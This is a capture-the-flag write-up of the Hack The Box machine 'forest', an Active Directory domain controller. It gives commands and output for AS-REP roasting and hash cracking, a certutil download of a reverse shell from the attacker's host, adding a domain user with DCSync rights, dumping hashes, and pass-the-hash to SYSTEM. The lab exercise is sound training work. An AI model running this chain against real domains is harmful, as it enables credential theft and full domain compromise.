---
ip: "10.10.10.161"
hostname: "forest"
fqdn: "forest.htb.local"
---
# forest

Tags: #active-directory #windows #asrep-roast #password-cracking #winrm #bloodhound #ad-permissions #dcsync

## scan

### nmap

```sh
sudo rustscan -a 10.10.10.161 -- -T4 -sV -sC -oA tcp-all
```

```
Nmap scan report for forest (10.10.10.161)
Host is up, received echo-reply ttl 127 (0.27s latency).
Scanned at 2023-07-08 13:37:38 EDT for 70s

PORT      STATE SERVICE      REASON          VERSION
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-07-08 17:44:34Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  "-V       syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45101/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 20703/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-07-08T10:45:30-07:00
| smb2-time:
|   date: 2023-07-08T17:45:27
|_  start_date: 2023-07-08T17:42:35
```

### smb

```sh
# get OS, hostname, and domain info, as well as signing (for relay attacks)
# also check null session
crackmapexec smb forest -u '' -p ''
SMB         forest          445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         forest          445    FOREST           [+] htb.local\:

# list shares
smbmap -H 10.10.10.161 -u '' -p ''
# none

# deeper scan
enum4linux -u '' -aMld forest | tee enum4linux.log
# a lot of output...

# password policy
❯ crackmapexec smb forest -u '' -p '' --pass-pol
SMB         forest          445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         forest          445    FOREST           [+] htb.local\:
SMB         forest          445    FOREST           [+] Dumping password info for domain: HTB
SMB         forest          445    FOREST           Minimum password length: 7
SMB         forest          445    FOREST           Password history length: 24
SMB         forest          445    FOREST           Maximum password age: Not Set
SMB         forest          445    FOREST
SMB         forest          445    FOREST           Password Complexity Flags: 000000
SMB         forest          445    FOREST           	Domain Refuse Password Change: 0
SMB         forest          445    FOREST           	Domain Password Store Cleartext: 0
SMB         forest          445    FOREST           	Domain Password Lockout Admins: 0
SMB         forest          445    FOREST           	Domain Password No Clear Change: 0
SMB         forest          445    FOREST           	Domain Password No Anon Change: 0
SMB         forest          445    FOREST           	Domain Password Complex: 0
SMB         forest          445    FOREST
SMB         forest          445    FOREST           Minimum password age: 1 day 4 minutes
SMB         forest          445    FOREST           Reset Account Lockout Counter: 30 minutes
SMB         forest          445    FOREST           Locked Account Duration: 30 minutes
SMB         forest          445    FOREST           Account Lockout Threshold: None
SMB         forest          445    FOREST           Forced Log off Time: Not Set

# users
❯ cme smb forest --users
# ---- snip ----
SMB         forest          445    FOREST           htb.local\sebastien
SMB         forest          445    FOREST           htb.local\lucinda
SMB         forest          445    FOREST           htb.local\svc-alfresco
SMB         forest          445    FOREST           htb.local\andy
SMB         forest          445    FOREST           htb.local\mark
SMB         forest          445    FOREST           htb.local\santi
# ---- snip ----
```

### ldap

```sh
# check AS-REP roastable users
# add '-k' to use kerberos authentication
crackmapexec ldap forest.htb.local -u '' -p '' --asreproast asreproast.txt
# error?


# Trying alternate way:
impacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip forest 'htb.local/:'
# got svc-alfresco!


# check Kerberoastable users
crackmapexec ldap forest.htb.local -u '' -p '' --kerberoasting kerberoast.txt
# no entries


# trying alternate way:
❯ impacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip forest 'htb.local/:'
# no entries


# get domain SID
crackmapexec ldap forest.htb.local -u '' -p '' --get-sid
# no result?


# list users with admin rights
❯ cme ldap forest -u '' -p '' --admin-count
# ---- snip ----
LDAP        forest          389    FOREST           svc-alfresco


# look for user passwords within descriptions
crackmapexec ldap forest.htb.local -u '' -p '' -M get-desc-users
# nothing interesting
```


## access

Based on initial scans, I see that the user `svc-alfresco` is a service account that has some kind of admin rights, and it is AS-REP roastable!

Let's try to crack that hash:

```sh
❯ hashcat --force -m 18200 -w3 -O asreproast.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 
# ---- snip ----
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c792d574a807ec51108989af6b013ce3$45f7ad107d105bb16889ba6c16ab0d0d7c326d38f78aa17ec76efe616359d87bfe5ec0e4328b507531ef39c8f254c6798eff6048e0162bd75f046c790e77d294c847cb69505d61811ecf45c04e7b24060fb19a47874dac0782ae51f057faf24779b49ddfafbcb61f5379ae2de41fe1e3e6df4f30d58fd666708fe69f48d90a88569a4c7125b4f1bb2af46525d4f1204f0cdb43d0af9ba2ff850e68d09bd7b7d0be721af3408e5a6b78751975aff0401fc97cb497a0618a93d27e5c416b68056e15c77636330b29fc490eea5dd1ed5221f5588bf1ed147e9eba1f9e3cb1c657f25232a981293e:s3rvice
```

Nice! The #credentials are:
- `svc-alfresco:s3rvice`

Let's see how we can use those creds:

```sh
❯ cme smb forest -u svc-alfresco -p s3rvice                                       
SMB         forest          445    FOREST           [+] htb.local\svc-alfresco:s3rvice 

❯ cme winrm forest -u svc-alfresco -p s3rvice
WINRM       forest          5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Looks like we can use it to get access via WinRM!

```sh
❯ evil-winrm -i forest -u svc-alfresco -p 's3rvice'
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Hmm. I'm only running in medium integrity level, not as admin.

Let's get a more stable shell than Evil-WinRM. I couldn't list files using Evil-WinRM.

```sh
# make reverse shell binary
❯ msfvenom -p windows/shell_reverse_tcp -f exe -o rsh.exe lport=443 lhost=tun0

# host on http
❯ python -m http.server 80          

# start listener
❯ nc -lvnp 443


# on victim:
# download
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> certutil -split -urlcache -f http://10.10.14.8/rsh.exe

# execute reverse shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> c:\Users\svc-alfresco\Documents\rsh.exe
```

Note: tried hosting over SMB first, but it wouldn't let me authenticate to my SMB server and establish a session.

Now we have a stable interactive shell!


## privesc

Since this is an active directory box, I'm going to start by looking for paths to domain admin using Bloodhound.

```sh
# grab SharpHound, put in folder with http server
cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .

# on victim
# download
certutil -split -urlcache -f http://10.10.14.8/SharpHound.ps1

# execute
powershell -ep bypass
. .\sharphound.ps1
Invoke-BloodHound -CollectionMethod All
```

Then I copied the bloodhound zip file over and started bloodhound on my Kali box to examine the results.

I got stuck trying to find a path to own the domain and looked into the HTB official writeup and [ippsec's video](https://www.youtube.com/watch?v=H9FcE_FMZio). For whatever reason, my bloodhound didn't show the path from `svc-alfresco` to the `Account Operators` group, and it also didn't show the link from `Account Operators` to `Exchange Windows Permissions`. No idea why.

```powershell
# on kali
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

# on victim
# create new user that will get DCSync privs
net user derp herpderp /add /domain
net group "Exchange Windows Permissions" derp /add
net localgroup "Remote Management Users" derp /add

# add DCSync privs to new user
certutil -split -urlcache -f http://10.10.14.8/PowerView.ps1
. .\PowerView.ps1
$pass = ConvertTo-SecureString 'herpderp' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\derp', $pass)
Add-DomainObjectAcl -PrincipalIdentity derp -Credential $cred -TargetIdentity htb.local -Rights DCSync
```

Now to perform the DCSync with `secretsdump`:

```sh
❯ impacket-secretsdump -just-dc -outputfile dcsync 'htb/derp:herpderp@forest'       
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
# ---- snip ----

❯ impacket-psexec -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'Administrator@forest'
```

And we get a SYSTEM shell!

## proof

[//]: # (INSERT PROOF TEMPLATE(S) HERE)